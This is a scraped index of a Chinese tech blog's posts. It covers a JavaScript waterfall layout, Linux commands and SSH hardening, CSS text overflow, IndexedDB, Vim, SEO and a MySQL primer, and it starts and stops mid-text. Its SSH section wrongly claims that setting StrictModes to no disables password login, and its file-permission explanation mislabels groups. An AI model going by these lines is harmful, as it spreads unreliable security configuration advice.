+拼接过来的容器的高度\n为了体验更好，可以将上面操作封装到一个函数中，当网页加载完毕加执行（window.onload），当页面宽度高度发送变化时也执行(window.onresize)\n例如：\nvar data = document.getElementsByClassName('imgs');\rfunction datamain(){\rvar datawidtha = window.innerWidth;\rvar datawidthb = Math.floor(data[0].offsetWidth);\rvar dataab = Math.floor(datawidtha/datawidthb);\rvar ints = Math.floor((datawidtha - dataab*datawidthb)/(dataab+1))\rvar arr = [];\rfor(var i=0;i\u0026lt;data.length;i++){\rif(i\u0026lt;dataab){\rdata[i].style.top = 0;\rdata[i].style.left = (datawidthb+ints) * i + \u0026quot;px\u0026quot;;\rarr.push(data[i].offsetHeight);\r}else{\rvar datamin = arr[0];\rvar index = 0;\rfor(var a = 0; a\u0026lt;arr.","title":"原生js实现瀑布流布局"},{"content":"linux发行版有很多，这里使用的是Ubuntu\n个人喜欢使用无界面版本（ubuntu-20.04-live-server-amd64）\n有关于树莓派的看这个\n修改为国内源\nnano /etc/apt/sources.list\n替换内容为\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\r# 预发布软件源，不建议启用\r# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\r注：该源为清华大学开源软件镜像站的,可以修改为其他镜像站的源\n163镜像源\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\rdeb http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse\rdeb http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse\rdeb http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse\rdeb http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse\r# deb-src http://mirrors.163.com/ubuntu/ focal main restricted universe multiverse\r# deb-src http://mirrors.163.com/ubuntu/ focal-security main restricted universe multiverse\r# deb-src http://mirrors.163.com/ubuntu/ focal-updates main restricted universe multiverse\r# deb-src http://mirrors.163.com/ubuntu/ focal-backports main restricted universe multiverse\r# 预发布软件源，不建议启用\r# deb http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse\r# deb-src http://mirrors.163.com/ubuntu/ focal-proposed main restricted universe multiverse\rsudo apt update #更新源 sudo apt upgrade #更新系统\n安装app\nsudo apt install App名字\n例如安装ssh服务：\napt update apt install openssh-server\npoweroff 立刻关机\nshutdown -h now 立刻关机\nshutdown -r now 立刻重启\nshutdown -r 10 10分钟后重启\nshutdown -r 1:00 当时间为1:00时重启\nwget 下载文件链接\n安装.deb文件\nsudo dpkg -i 文件名\n例如：\nsudo dpkg -i code_1.40.2-1574694120_amd64.deb\nclear 清除\nls和cd\ncd命令是前往指定目录\ncd ~ 前往目前使用的用户的Home目录（家目录）\ncd .. 返回上一级目录\ncd /etc/python3 前往指定目录\ncd - 返回刚刚所在的目录\ncd ../../ 向上返回两级目录\ncd ./ 前往当前目录\npwd 显示当前目录路径\nls -ah 将所有目录（包括隐藏目录）显示出来\n如果有很多层目录，那么需要一个绝对目录\n绝对目录：指目录的绝对位置，从根目录开始的路径，完整的描述文件位置的路径就是绝对路径 相对目录：指目标相对于当前文件的路径\nls (list 的简写)\nls 返回当前所在的目录的所有子目录和子文件\nls -l 返回文件的一些信息，权限，用户，文件大小，修改时间。文件名，total后面的数字是指这个目录下的文件数，包括隐藏文件\nls -a 显示所有文件，包括已经隐藏的文件(以 . 开头的)\nls -lh 这个指令和-l一样，返回权限，用户，文件大小，修改时间。文件名，不过文件大小是使用k，m这些来表示\nls \u0026ndash;help 查看ls的全部功能\ncp，mv，touch，mkdir\ntouch 新建一个文件 例如： touch hallo.py\n如果想同时建立多个文件，那么输入多个文件的名字，使用空格分开，例如：\ntouch hello.py world.py\ncp 是复制文件或者文件夹的指令，使用方法：\ncp hello.py world.py\n注意: 如果复制的文件已经存在, 它将会直接覆盖已存在的文件，那么可以： cp -i hello.py world.py 在返回的提问中回复任何大小写形式的y或者yes，将执行覆盖操作，回复其他则取消这个执行\ncp -R hello/ world/ 复制文件夹\ncp go* gogo/ 复制所有的以go开头的文件到gogo文件夹中\ncp *go gogo/ 复制所有的以go结尾的文件到gogo文件夹中\nmv 是用来移动（剪切）文件\nmv 要移动的文件 要移动到的文件夹，例如：\nmv hello.py hello/\nmv world.py hallo.py 重命名文件\nmv \u0026ndash;help 查看其他mv的用法\nmkdir hello 新建一个文件夹\nrmdir hello/world 删除hello目录下的world目录，不能删除有文件的文件夹，只能删除一个空的文件夹\nrm world/ 可以删除不是空的文件夹\nrm -i world/ 删除文件时提示\nrm -I world/ 删除超过3个文件时才提示，少于3个时不提示\nrm -r world/ 删除目录及目录下的所有文件及目录\nrm -rf world/ 删除目录下及目录下的所有文件及目录，没有提示地强制递归删除文件\nnano hallo.py nano是一个，^是ctrl键，例如ctal+x 是退出的指令\ncat hallo.py 输出一个文件的文本内容\ncat hallo.py \u0026gt; world.py 把一个文件复制成另一个文件\ncat hallo.py hello.py \u0026gt; world.py 把两个文件的内容合并到另一个文件\ncat world.py \u0026raquo; gogo.py 补充到另一个文件的内容的后面\n文件权限 例如 drwxr-xr-x\nd是说明这是一个文件夹，如果是-那么就是说明这是一个文件\nrwx r 可读，w 可写， x 可执行，如果有是-说明当前使用的用户账号不能完成某一个操作，User是当前使用的用户\nr-x r 可读，w 不可写， x 可执行，说明Others这个组的用户不能完成写入的能力，没有写入的权限，Others是指当前用户所在的组\nr-x r 可读，w 不可写， x 可执行，说明User 和 Group 以外的人不能完成写入的能力，没有写入的权限，Others是除当前用户和组之外的人\n修改文件权限\nchmod u+r hallo.py\nchmod ug+rw hello.py 给当前用户添加可读权限\n+ 为加上某一个权限 - 为去掉某一个权限 = 为等于某个权限\nu: 对于 User 修改, g: 对于 Group 修改 o: 对于 Others 修改 a: 对于所有人修改\nchmod 755 hello.py 修改文件权限 u为rwx，可读可写可执行，g为r-x可读不可写可执行，o为r-x可读不可写可执行\nr=4，w=2，x=1\nifconfig 这个命令是用来查看当前linux设备的ip\nip addr 这个命令也是用来查看当前linux设备的ip的\napt-get install net-tools 安装网络工具，用于解决ip没有分配之类的网络管理工具\nexit 退出ssh控制\ntop 查看cpu占用的一些信息\nlinux-ssh安全配置\nssh安全\nlast -f /var/log/wtmp 查看IP登陆日志\n修改ssh端口\nnano /etc/ssh/sshd_config\n找到Port，修改端口，如果修改为2222，那么默认ssh连接端口为2222，原来的22端口报废（不能使用22端口登录了，计算机有65535个端口，扫描端口都要扫半天）\n禁止root用户ssh登录\n找到PermitRootLogin，把yes修改为no\n其他ssh安全配置\nLoginGraceTime 登录一次花费多少时间，当超过这个时间，则要求重新登录\nMaxAuthTries 限制尝试登录错误的次数，当超过这个次数之后拒绝登录尝试 MaxSessions 限制每个连接可以并行开启多少个会话\nStrictModes，修改为no，为禁用密码登录\n重启sshd服务 service ssh restart\nSSH密钥登录\nssh-keygen -t rsa -b 4096 生成私钥和公钥\n在.ssh的目录下有两个文件，id_rsa 为私钥，id_rsa.pub 为公钥\ncat ~/.ssh/id_rsa.pub \u0026raquo; authorized_keys\n然后上传authorized_keys到服务器上\n上传文件可以用ftp或者scp\n例如 scp -P 2222 .\\authorized_keys pi@192.168.1.106:~/.ssh\n给.ssh目录和authorized_keys文件设置权限\nchmod -R 0700 ~/.ssh\nchmod -R 0644 ~/.ssh/authorized_keys\nssh pi@192.168.1.106 -p 2222\n就可以不用密码进行登录了\nlinux下Operation not permitted\n先看看文件权限ll，能使用root用户或者sudo最好，然后尝试chmod\n如果在root用户或者sudo下也不能对文件或者文件夹进行操作，那么\nchattr +i hello.py // 使用i属性来锁定文件，避免修改文件\nlsattr hello.py // 查看加锁\nchattr -i hello.py // 去除i属性，便可以修改该文件\na：可以修改文件，但是不能删除\ni: 不能删除，不能修改，不能移动\nifconfig // 查看网络配置，或者ip addr ls\n网卡配置文件在/etc/sysconfig/network-scripts下\n网卡配置文件名称一般为ifcfg-xxx\n默认为关闭的，需要使用DHCP获取ip，需要修改ONBOOT=no，修改为yes\n配置静态ip，需要修改BOOTPROTO为static\n添加下面内容\nIPADDR=192.168.186.128 // 设置IP地址 NETMASK=255.255.255.0 // 设置子网掩码 GATEWAY=192.168.186.1 // 设置网关 DNS1=114.114.114.114 // 设置dns\nnmcli c reload // 重启网络服务\nip addr // 查看本地IP地址以及其他网卡信息\nip link set dev eth0 up // 启用网卡 或者ifup eth0\nifconfig eth0 192.168.186.128 // 修改指定网卡的ip\nifconfig eth0 192.168.186.128 netmask 255.255.255.0 // 修改子网掩码\nroute -n // 显示和操作IP路由表\nroute add default gw 192.168.186.1 // 增加指定网关，其中的default是指0.0.0.0的，可自己选择想要的，例如route add -host 192.168.186.2 gw 192.168.186.1\nroute add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.186.1 // 设置网段的网关\nroute del default gw 192.168.186.1 // 删除指定网关\n","permalink":"https://99999.fun/posts/8/","summary":"linux发行版有很多，这里使用的是Ubuntu\n个人喜欢使用无界面版本（ubuntu-20.04-live-server-amd64）\n有关于树莓派的看这个\n修改为国内源\nnano /etc/apt/sources.list\n替换内容为\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\rdeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\r# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\r# 预发布软件源，不建议启用\r# deb https://mirrors.","title":"linux系统的日常使用"},{"content":"当文本宽度超过容器的宽度那么将导致溢出\n使用text-overflow属性会修剪文本导致文本显示不全\n这里使用的方法是word-break: break-all+white-space: pre-wrap\nword-break: break-all\n允许在单词内换行（还有个keep-all属性，用来只能在半角空格和连字符处换行，默认值为normal）\nwhite-space: pre-wrap\nnormal：默认，空白被忽略\nnowrap：文本不换行，文本在同一行继续\npre：保留空格，换行保留，不自动换行\npre-wrap：保留完整空格，保留换行符，自动换行\npre-line：保留空格（可能不完整），保留换行\n一个提供换行规则，另一个保证换行的样式还存在（例如换行符，空格等等），而且还提供自动换行功能\n","permalink":"https://99999.fun/posts/6/","summary":"当文本宽度超过容器的宽度那么将导致溢出\n使用text-overflow属性会修剪文本导致文本显示不全\n这里使用的方法是word-break: break-all+white-space: pre-wrap\nword-break: break-all\n允许在单词内换行（还有个keep-all属性，用来只能在半角空格和连字符处换行，默认值为normal）\nwhite-space: pre-wrap\nnormal：默认，空白被忽略\nnowrap：文本不换行，文本在同一行继续\npre：保留空格，换行保留，不自动换行\npre-wrap：保留完整空格，保留换行符，自动换行\npre-line：保留空格（可能不完整），保留换行\n一个提供换行规则，另一个保证换行的样式还存在（例如换行符，空格等等），而且还提供自动换行功能","title":"简单解决文本溢出问题"},{"content":"IndexedDB是浏览器提供的本地数据库，允许存储数据，采用键值对存储，允许异步请求，允许索引请求，IndexedDB理论上存储空间没有限制\n打开（新建）indexedDB：\nindexedDB.open()，该方法有俩个值，第一个是数据库名（没有该数据库那么就新建），第二个值为数据库的版本，一般来说默认为1（必须是大于0的自然数），例如：\nvar datadb = window.indexedDB.open(\u0026quot;data\u0026quot;,1);\rdatadb.onerror = function(){\rconsole.log(\u0026quot;数据库打开失败\u0026quot;)\r}\rdatadb.onsuccess = function(){\rconsole.log(\u0026quot;数据库打开成功\u0026quot;);\r}\rdatadb.onupgradeneeded = function(event){ console.log(\u0026quot;数据库版本升级\u0026quot;);\r}\ronerror事件表示打开数据库失败\nonsuccess事件表示打开数据库成功\nonupgradeneeded事件表示数据库升级（当数据库版本低于指定的数据库版本）（另外，新建数据库，操作新的数据库也可以在该事件中处理）\n新建数据对象（数据表）\ndatadb.onupgradeneeded = function(event) {\rconsole.log(\u0026quot;数据库升级\u0026quot;);\rvar objdb = event.target.result.createObjectStore(\u0026quot;abc\u0026quot;,{keyPath: \u0026quot;id\u0026quot;});\r}\r表名为abc，主键为id，主键默认为索引\n判断是否存在该表\nif(!event.target.result.objectStoreNames.contains('abc')){\rvar objdb = event.target.result.createObjectStore(\u0026quot;abc\u0026quot;,{keyPath: \u0026quot;id\u0026quot;});\r}\r递增属性(可以用于作为主键)\nvar maindb = event.target.result.createObjectStore(\u0026quot;abc\u0026quot;,{autoIncrement: true});\r唯一属性\nobjdb.createIndex(\u0026quot;id\u0026quot;,\u0026quot;id\u0026quot;,{unique: false})\rcreateIndex()，三个参数分别是索引名称，索引的属性，配置对象，用来新建索引\n添加数据\nvar datadb = window.indexedDB.open(\u0026quot;data\u0026quot;,1);\rvar db;\rvar objdb;\rdatadb.onupgradeneeded = function(event) {\rconsole.log(\u0026quot;数据库升级\u0026quot;);\rdb = event.target.result;\rconsole.log(db)\rif(!event.target.result.objectStoreNames.contains('abc')){\robjdb = event.target.result.createObjectStore(\u0026quot;abc\u0026quot;,{keyPath: \u0026quot;id\u0026quot;});\r}\r}\rdatadb.onsuccess = function (event) {\rconsole.log(\u0026quot;数据添加成功\u0026quot;);\rvar tp = event.target.result;\rvar transaction = tp.transaction(['abc'], 'readwrite');\rvar objadd = transaction.objectStore('abc');\robjadd.add({id: 1,name: 'a', email: \u0026quot;a@xiaochenabc123.test.com\u0026quot;});\r} 只要通过一个叫事务（transaction）来操作数据库，有两个参数，分别是要操作的数据对象，事务模式\n事务模式有三种：\nreadOnly：只读 readwrite：读写 versionchange：数据库版本变化\n不指定则默认为readOnly（只读）\n添加多条数据\nvar arrdata = [\r{id: 1,name: 'a', email: \u0026quot;a@xiaochenabc123.test.com\u0026quot;},\r{id: 2,name: 'b', email: \u0026quot;b@xiaochenabc123.test.com\u0026quot;},\r{id: 3,name: 'c', email: \u0026quot;c@xiaochenabc123.test.com\u0026quot;}\r];\rdatadb.onsuccess = function (event) {\rconsole.log(\u0026quot;数据库添加成功\u0026quot;);\rvar tp = event.target.result;\rvar transaction = tp.transaction(['abc'], 'readwrite');\rvar objadd = transaction.objectStore('abc');\rfor(var i in arrdata){\robjadd.add(arrdata[i]);\r}\r} 读取数据\nvar datadb = window.indexedDB.open(\u0026quot;data\u0026quot;,4); datadb.onsuccess = function (event) {\rconsole.log(\u0026quot;数据库读取成功\u0026quot;);\rvar ab = event.target.result;\rvar transactiona = ab.transaction(['abc']);\rvar objectStorea = transactiona.objectStore('abc');\rvar datas = objectStorea.get(1); // objectStorea.get()方法的参数为主键的值\rdatas.onsuccess = function( event) {\rif (datas.result) {\rconsole.log('ID: ' + datas.result.id);\rconsole.log('Name: ' + datas.result.name);\rconsole.log('Email: ' + datas.result.email);\r}else {\rconsole.log('未读取到数据记录');\r}\r}; datas.onerror = function(event) {\rconsole.log('数据库读取成功');\r};\r}\r读取多条数据（遍历）\nvar datadb = window.indexedDB.open(\u0026quot;data\u0026quot;,4); datadb.onsuccess = function(){\rvar db= event.target.result;\rdisplayData();\rfunction displayData() {\rvar transaction = db.transaction([\u0026quot;abc\u0026quot;], \u0026quot;readonly\u0026quot;);\rvar objectStore = transaction.objectStore('abc');\robjectStore.openCursor().onsuccess = function(event) {\rvar datas = event.target.result;\rif(datas) {\rconsole.log(\u0026quot;id:\u0026quot;+datas.key);\rconsole.log(\u0026quot;name:\u0026quot;+datas.value.name);\rconsole.log(\u0026quot;email:\u0026quot;+datas.value.email)\rconsole.log(datas.value)\rdatas.continue();\r} }\r}\r更新数据\n和add()类似\ndatadb.onsuccess = function (event) {\rconsole.log(\u0026quot;数据更新成功\u0026quot;);\rvar tp = event.target.result;\rvar transaction = tp.transaction(['abc'], 'readwrite');\rvar objadd = transaction.objectStore('abc');\robjadd.put({id: 1,name: 'hallo', email: \u0026quot;abc@xiaochenabc123.test.com\u0026quot;})\r} 删除数据\ndatadb.onsuccess = function (event) {\rconsole.log(\u0026quot;数据更新成功\u0026quot;);\rvar tp = event.target.result;\rvar transaction = tp.transaction(['abc'], 'readwrite');\rvar objadd = transaction.objectStore('abc');\robjadd.delete(1);\rconsole.log('数据删除成功');\r} ","permalink":"https://99999.fun/posts/5/","summary":"IndexedDB是浏览器提供的本地数据库，允许存储数据，采用键值对存储，允许异步请求，允许索引请求，IndexedDB理论上存储空间没有限制\n打开（新建）indexedDB：\nindexedDB.open()，该方法有俩个值，第一个是数据库名（没有该数据库那么就新建），第二个值为数据库的版本，一般来说默认为1（必须是大于0的自然数），例如：\nvar datadb = window.indexedDB.open(\u0026quot;data\u0026quot;,1);\rdatadb.onerror = function(){\rconsole.log(\u0026quot;数据库打开失败\u0026quot;)\r}\rdatadb.onsuccess = function(){\rconsole.log(\u0026quot;数据库打开成功\u0026quot;);\r}\rdatadb.onupgradeneeded = function(event){ console.log(\u0026quot;数据库版本升级\u0026quot;);\r}\ronerror事件表示打开数据库失败\nonsuccess事件表示打开数据库成功\nonupgradeneeded事件表示数据库升级（当数据库版本低于指定的数据库版本）（另外，新建数据库，操作新的数据库也可以在该事件中处理）\n新建数据对象（数据表）\ndatadb.onupgradeneeded = function(event) {\rconsole.log(\u0026quot;数据库升级\u0026quot;);\rvar objdb = event.target.result.createObjectStore(\u0026quot;abc\u0026quot;,{keyPath: \u0026quot;id\u0026quot;});\r}\r表名为abc，主键为id，主键默认为索引\n判断是否存在该表\nif(!event.target.result.objectStoreNames.contains('abc')){\rvar objdb = event.target.result.createObjectStore(\u0026quot;abc\u0026quot;,{keyPath: \u0026quot;id\u0026quot;});\r}\r递增属性(可以用于作为主键)\nvar maindb = event.target.result.createObjectStore(\u0026quot;abc\u0026quot;,{autoIncrement: true});\r唯一属性\nobjdb.createIndex(\u0026quot;id\u0026quot;,\u0026quot;id\u0026quot;,{unique: false})\rcreateIndex()，三个参数分别是索引名称，索引的属性，配置对象，用来新建索引\n添加数据\nvar datadb = window.indexedDB.open(\u0026quot;data\u0026quot;,1);\rvar db;\rvar objdb;\rdatadb.onupgradeneeded = function(event) {\rconsole.log(\u0026quot;数据库升级\u0026quot;);\rdb = event.","title":"IndexedDB浏览器数据库学习笔记"},{"content":"Vim是从vi发展出来的一个文本编辑器。提供代码补完、编译及错误跳转等功能\nvim的五种模式（正常模式，插入模式，命令行模式，可视化模式，替换模式）\n启动vim默认就是在正常模式中，在该模式中按i进入插入模式，按:进入命令行模式，在插入模式或者命令行模式中按Esc进入普通模式\n普通模式不能输入文本，只能进行现有内容的处理（移动复制删除等等）\n正常模式：Esc或Ctrl+[进入 插入模式：按i键进入（a和o都可以） 命令行模式：在正常模式下按:进入 可视化模式：按v或者V，ctrl-V（或者ctrl-Q）进入 替换模式：在正常模式下按r进入\nv 进入字符可视化模式 V 进入行可视化模式 Ctrl+v 进入块可视化模式\n可视模式是用来选取一段文本，光标移到段首，在普通模式下按 v 进入可视模式，然后把光标移到段末\n移动光标\nh：光标左移 j：光标下移 k：光标上移 l：光标右移\n^或者0：移动到行首（命令行模式） $：移动到行尾（命令行模式）,可搭配数字来组合，例如2$就是2表示要移动的行数\n移动光标也可以搭配数字来进行组合，例如：\n3+h：光标左移3个字符\nvim hallo.js\n在vim界面新建文件\n:open hallo.js\n在vim界面打开一个新窗口新建文件\n:split file\n切换到上一个文件\n:bp\n切换到下一个文件\n:bn\n查看vim文件列表\n:args\n打开远程文件\n:e \\hallo abc.txt\n/text：按n健查找下一个，按N健查找上一个\n?text：按n健查找上一个，按N健查找下一个\n:wq：保存并且退出，加!表示强制\n:q!：强制退出并且放弃所有更改\n:e!：放弃修改，并且重新打开文件\n","permalink":"https://99999.fun/posts/3/","summary":"Vim是从vi发展出来的一个文本编辑器。提供代码补完、编译及错误跳转等功能\nvim的五种模式（正常模式，插入模式，命令行模式，可视化模式，替换模式）\n启动vim默认就是在正常模式中，在该模式中按i进入插入模式，按:进入命令行模式，在插入模式或者命令行模式中按Esc进入普通模式\n普通模式不能输入文本，只能进行现有内容的处理（移动复制删除等等）\n正常模式：Esc或Ctrl+[进入 插入模式：按i键进入（a和o都可以） 命令行模式：在正常模式下按:进入 可视化模式：按v或者V，ctrl-V（或者ctrl-Q）进入 替换模式：在正常模式下按r进入\nv 进入字符可视化模式 V 进入行可视化模式 Ctrl+v 进入块可视化模式\n可视模式是用来选取一段文本，光标移到段首，在普通模式下按 v 进入可视模式，然后把光标移到段末\n移动光标\nh：光标左移 j：光标下移 k：光标上移 l：光标右移\n^或者0：移动到行首（命令行模式） $：移动到行尾（命令行模式）,可搭配数字来组合，例如2$就是2表示要移动的行数\n移动光标也可以搭配数字来进行组合，例如：\n3+h：光标左移3个字符\nvim hallo.js\n在vim界面新建文件\n:open hallo.js\n在vim界面打开一个新窗口新建文件\n:split file\n切换到上一个文件\n:bp\n切换到下一个文件\n:bn\n查看vim文件列表\n:args\n打开远程文件\n:e \\hallo abc.txt\n/text：按n健查找下一个，按N健查找上一个\n?text：按n健查找上一个，按N健查找下一个\n:wq：保存并且退出，加!表示强制\n:q!：强制退出并且放弃所有更改\n:e!：放弃修改，并且重新打开文件","title":"简单使用Vim编辑器"},{"content":"SEO：搜索引擎优化（Search Engine Optimization），是利用搜索引擎的规则来提升网站在该搜索引擎的排名（免费，高回报）\nrobots.txt就是robots协议，用来告诉网络蜘蛛，这个网站什么内容是不应该获取的，那些内容可以获取，例如：淘宝就屏蔽了百度的爬虫\nrobots.txt文件应该放在网站根目录下\n允许指定蜘蛛获取，*为通配符\nUser-agent: *\n允许指定目录可以被获取\nAllow: /\n指定Sitemap文件在哪\nSitemap: sitemap.xml\n不允许指定目录被获取（注意该方法会模糊匹配，例如/adminxxx，也是会被屏蔽）\nDisallow: /admin\ndescription（描述）\nkeywords（关键词）\nSitemap（通知搜索引擎，该网站有哪些可以供爬取的，常见的有xml，html）\nHTML标签优化\n语义化标签，例如header，nav，footer\n内部连接优化\n尽量不要使用JavaScript来设置链接，应该使用简单的a href\n友情链接\n友情链接就是在自己网站上放其他网站的链接，友情链接实质上并不能带来多少访问量，而且是用来增强搜索引擎的收录量爬取量\n注意：请不要在友情链接上加rel=\u0026ldquo;nofollow\u0026rdquo;，该属性会告诉搜索引擎爬虫不用抓取目标页，那么这个友情链接就是废了\n而且不要乱加友情链接，应该选择高质量，而且内容相似，更新频率高，而且还要有一定的访问量\n注意：如果没有必要就不要单向链接，爬虫跑过去，就不会回来了，一直到找到你的链接，通过该链接回来，所以没有必要不要单向链接\n尽量避免使用iframe标签，搜索引擎不会抓取iframe标签的内容\n重要信息请勿使用js输出，爬虫不会抓取js的内容\n给图片加alt信息，重要信息请放头部，有部分搜索引擎爬虫会限制抓取的长度\n","permalink":"https://99999.fun/posts/2/","summary":"SEO：搜索引擎优化（Search Engine Optimization），是利用搜索引擎的规则来提升网站在该搜索引擎的排名（免费，高回报）\nrobots.txt就是robots协议，用来告诉网络蜘蛛，这个网站什么内容是不应该获取的，那些内容可以获取，例如：淘宝就屏蔽了百度的爬虫\nrobots.txt文件应该放在网站根目录下\n允许指定蜘蛛获取，*为通配符\nUser-agent: *\n允许指定目录可以被获取\nAllow: /\n指定Sitemap文件在哪\nSitemap: sitemap.xml\n不允许指定目录被获取（注意该方法会模糊匹配，例如/adminxxx，也是会被屏蔽）\nDisallow: /admin\ndescription（描述）\nkeywords（关键词）\nSitemap（通知搜索引擎，该网站有哪些可以供爬取的，常见的有xml，html）\nHTML标签优化\n语义化标签，例如header，nav，footer\n内部连接优化\n尽量不要使用JavaScript来设置链接，应该使用简单的a href\n友情链接\n友情链接就是在自己网站上放其他网站的链接，友情链接实质上并不能带来多少访问量，而且是用来增强搜索引擎的收录量爬取量\n注意：请不要在友情链接上加rel=\u0026ldquo;nofollow\u0026rdquo;，该属性会告诉搜索引擎爬虫不用抓取目标页，那么这个友情链接就是废了\n而且不要乱加友情链接，应该选择高质量，而且内容相似，更新频率高，而且还要有一定的访问量\n注意：如果没有必要就不要单向链接，爬虫跑过去，就不会回来了，一直到找到你的链接，通过该链接回来，所以没有必要不要单向链接\n尽量避免使用iframe标签，搜索引擎不会抓取iframe标签的内容\n重要信息请勿使用js输出，爬虫不会抓取js的内容\n给图片加alt信息，重要信息请放头部，有部分搜索引擎爬虫会限制抓取的长度","title":"简单了解SEO"},{"content":"推荐使用mariaDB\n操作数据库\n创建数据库\nCREATE DATABASE xxx;\n删除数据库\nDROP DATABASE xxx;\n查看所有数据库\nSHOW DATABASES;\n查看指定数据库\nSHOW xxx;\n打开指定数据库\nUSE xxx;\n查看指定数据库的详细信息\nSHOW CREATE DATABASE xxx;\n修改指定数据库的字符集\nALTER DATABASE xxx CHARACTER SET gbk COLLATE gbk_bin;\n数据表的校对规则，与于指定数据集如何排序\nCOLLATE=utf8_bin\n指定字符集\nCHARSET=utf8\n查看当前mysql所支持的字符集\nSHOW CHARACTER SET;\n新建数据表\nCREATE TABLE xxx(\rid int(4),\remail char(20),\rstatus int(2),\rcode varchar(10)\r​ );\n添加数据\nINSERT INTO xxx VALUES(\r1,\r\u0026quot;hallo\u0026quot;,\r\u0026quot;1\u0026quot;,\r\u0026quot;xxx\u0026quot;\r);\r修改数据(根据条件)\nUPDATE xxx SET status=1 WHERE id = 4;\n删除数据(根据条件)\nDELETE FROM xxx WHERE id = 5;\n修改字段类型\nALTER TABLE 表名 MODIFY COLUMN 字段名 新数据类型;\n查询数据\n查询数据表的表结构（字段）\nSHOW COLUMNS FROM 表名\n查询数据表的数据\nSELECT * FROM 表名;\n根据条件查询 SELECT * FROM 表名1,表名2;\nSELECT * FROM 表名1.id aid,表名2.id bid; // 一次查询多个表，结果是一个二维表，因为表名1和表名2，都是查询id，避免区分不了，使用查询，设置列的别名，便于区分\nSELECT * FROM 表名 WHERE id \u0026gt;= 1;\nSELECT * FROM 表名 WHERE id IN (1,3,5);\nSELECT * FROM 表名 WHERE id BETWEEN 2 AND 7;\nSELECT * FROM 表名 WHERE id \u0026gt;= 1 AND name = \u0026ldquo;xxx\u0026rdquo;;\nSELECT * FROM 表名 WHERE id \u0026gt;= 1 OR name = \u0026ldquo;xxx\u0026rdquo;;\nSELECT * FROM 表名 WHERE id \u0026gt;= 1 NOT name = \u0026ldquo;xxx\u0026rdquo;;\nSELECT id name FROM 表名 WHERE name LIKE\u0026quot;a%\u0026quot;;\nSELECT 字段 FROM 表名 GROUP BY 字段; // 附属功能和DISTINCT一样，有去重功能\nSELECT DISTINCT 字段 FROM 表名; // 列出不同的值，功能和查询数据，并且数据不重复\n根据要求返回数据\nSELECT id FROM 表名;\n通过SELECT语句修改列名\nSELECT id abc FROM 表名;\n通过SELECT语句接WHRE条件\nSELECT id FROM 表名 WHERE name = \u0026ldquo;yes\u0026rdquo;;\n转义和匹配字符串\n百分号% 匹配任意长度的字符串，包括空字符串\n下划线_ 匹配单个字符串，可以使用多个下划线来指定匹配多长的字符串\n转义符\\ 用于输出或者匹配特殊字符，例如%和_\n排列\nSELECT name FROM 表名 ORDER BY id; // 按照id从低到高\nSELECT name FROM 表名 ORDER BY id DESC; // 使用DESC倒序\nSELECT name FROM 表名 ORDER BY id DESC,gender; // 先按照id倒序，如果有相同的值再按gender排序\nORDER BY 排序（升序（asc）降序（desc））\nSELECT 字段 FROM 表名 ORDER BY 字段 （排序方式）;\n默认的排序是ASC，可以忽略，如果有WHRE语句，那么ORDER BY要放在WHRE后面\nSELECT 字段1 , 字段2 , 字段3 FROM 表名; // 返回指定字段下的数据，而不是整个表的数据\nSELECT 字段1 , 字段2 别名1, 字段3 FROM 表名; // 使用SELECT查询，并将列名重命名，把字段2改为别名1\nSELECT * FROM 表名 ORDER BY DESC LIMIT 5 （OFFSET 1） // 分页返回，每页5条记录，获取第2条的记录（sql的索引从0开始）\nSELECT COUNT(*) FROM 表名; // 查询该表有多少条记录\nSELECT COUNT(*) 别名 FROM 表名 WHERE 字段 = \u0026lsquo;xxx\u0026rsquo;; // 查询该表有多少条记录符合要求\nSELECT 表名1.字段1 别名1, 表名1.字段2,表名2.字段1 别名2,表名2.字段2 FROM 表名1, 表名2; // 查询多个表的数据\nSELECT 别名1.id sid,别名1.name,别名2.id cid, 别名2.name names FROM 表名1 别名1,表名2 别名2; // 效果和上面一样，只是简洁一点\nSELECT 别名1.id sid,别名1.name,别名2.id cid, 别名2.name names FROM 表名1 别名1,表名2 别名2 WHERE 别名1.id\u0026lt;10 AND name =\u0026ldquo;hallo\u0026rdquo;; // 支持WHERE条件\nSQL约束 PRIMARY KEY 约束唯一标识数据库表中的每条记录，有助于快速查找表中的一个特定的记录。 主键必须包含唯一的值，主键列不能包含 NULL 